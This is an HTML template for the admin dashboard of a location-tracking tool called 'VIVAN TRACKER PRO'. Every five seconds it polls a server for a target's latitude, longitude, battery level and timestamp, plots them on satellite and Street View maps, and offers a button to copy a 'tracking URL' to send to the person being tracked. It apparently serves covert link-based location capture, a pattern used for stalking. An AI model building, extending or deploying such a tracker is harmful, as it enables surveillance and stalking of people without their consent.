<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIVAN TRACKER PRO | ADMIN</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; background: #0b0f19; color: white; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        header { background: #111827; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00d2ff; }
        .logo { font-family: 'Orbitron'; color: #00d2ff; font-size: 1.2rem; text-shadow: 0 0 10px rgba(0,210,255,0.5); }
        .stats { font-size: 0.8rem; color: #10b981; }
        
        #main-container { display: flex; flex: 1; position: relative; }
        #map { flex: 1; z-index: 1; }
        
        .control-panel { position: absolute; top: 10px; left: 50%; transform: translateX(-50%); z-index: 1000; background: rgba(17, 24, 39, 0.9); padding: 10px; border-radius: 8px; border: 1px solid #00d2ff; display: flex; gap: 10px; backdrop-filter: blur(5px); }
        .btn { padding: 8px 15px; border-radius: 5px; border: none; font-weight: 600; cursor: pointer; transition: 0.3s; font-size: 0.8rem; }
        .btn-copy { background: #00d2ff; color: #0b0f19; }
        .btn-street { background: #f4b400; color: white; }
        .btn:hover { opacity: 0.8; transform: scale(1.05); }

        .sidebar { width: 250px; background: #111827; border-left: 1px solid #1f2937; padding: 15px; overflow-y: auto; font-size: 0.9rem; }
        .log-item { background: #1f2937; padding: 10px; border-radius: 5px; margin-bottom: 10px; border-left: 3px solid #00d2ff; }
    </style>
</head>
<body>

<header>
    <div class="logo">VIVAN TRACKER PRO</div>
    <div class="stats">● ONLINE: {{ username }} | <a href="/logout" style="color:#ef4444; text-decoration:none;">LOGOUT</a></div>
</header>

<div id="main-container">
    <div class="control-panel">
        <button class="btn btn-copy" onclick="copyLink()">COPY TRACKING URL</button>
        <button id="street-view-btn" class="btn btn-street" onclick="openStreetView()">📍 STREET VIEW 360°</button>
    </div>

    <div id="map"></div>

    <div class="sidebar">
        <h3 style="color:#00d2ff; font-family:'Orbitron'; font-size:0.8rem;">LOCATION LOGS</h3>
        <div id="logs-container">
            <p style="color:#94a3b8; font-size:0.7rem;">Waiting for data...</p>
        </div>
    </div>
</div>

<script>
    var currentLat = 0, currentLon = 0;

    // --- MAP LAYERS ---
    var streetMap = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: 'OSM' });
    
    var googleSatellite = L.tileLayer('http://{s}.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', {
        maxZoom: 20, subdomains:['mt0','mt1','mt2','mt3'], attribution: 'Google Satellite'
    });

    var googleHybrid = L.tileLayer('http://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
        maxZoom: 20, subdomains:['mt0','mt1','mt2','mt3'], attribution: 'Google Hybrid'
    });

    // Initialize Map
    var map = L.map('map', {
        center: [26.7394, 83.8868], // Default to Kushinagar area
        zoom: 13,
        layers: [googleHybrid] // Default view is Real Photo + Roads
    });

    var baseMaps = {
        "Satellite (Photo)": googleSatellite,
        "Hybrid (Photo+Roads)": googleHybrid,
        "Standard Map": streetMap
    };
    L.control.layers(baseMaps).addTo(map);

    var marker = L.circleMarker([0, 0], { radius: 10, color: '#00d2ff', fillColor: '#00d2ff', fillOpacity: 0.8 }).addTo(map);

    function updateDashboard() {
        fetch('/get_data')
            .then(response => response.json())
            .then(data => {
                if (data.length > 0) {
                    var last = data[0];
                    currentLat = last.latitude;
                    currentLon = last.longitude;
                    
                    var newPos = [currentLat, currentLon];
                    marker.setLatLng(newPos);
                    map.setView(newPos, 16);

                    // Update Logs
                    document.getElementById('logs-container').innerHTML = `
                        <div class="log-item">
                            <b>Time:</b> ${last.timestamp}<br>
                            <b>Batt:</b> ${last.battery}%<br>
                            <b>Lat:</b> ${currentLat.toFixed(5)}<br>
                            <b>Lon:</b> ${currentLon.toFixed(5)}
                        </div>
                    `;
                }
            });
    }

    function openStreetView() {
        if(currentLat !== 0) {
            var url = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${currentLat},${currentLon}`;
            window.open(url, '_blank');
        } else {
            alert("No location data available yet!");
        }
    }

    function copyLink() {
        var dummy = document.createElement("input");
        document.body.appendChild(dummy);
        dummy.value = "{{ link }}";
        dummy.select();
        document.execCommand("copy");
        document.body.removeChild(dummy);
        alert("Tracking URL Copied!");
    }

    setInterval(updateDashboard, 5000);
    updateDashboard();
</script>

</body>
</html>
